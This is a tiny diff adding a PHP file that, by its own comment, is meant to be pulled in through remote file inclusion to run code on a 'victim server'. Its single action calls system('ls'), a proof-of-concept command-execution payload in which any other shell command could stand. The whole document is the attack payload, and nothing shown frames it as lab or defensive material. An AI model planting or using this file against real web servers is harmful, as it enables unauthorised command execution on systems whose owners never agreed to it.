@@ -1,0 +1,4 @@
+<?php
+// This file is used for rfi to run code on the victim server
+system('ls');
+?>
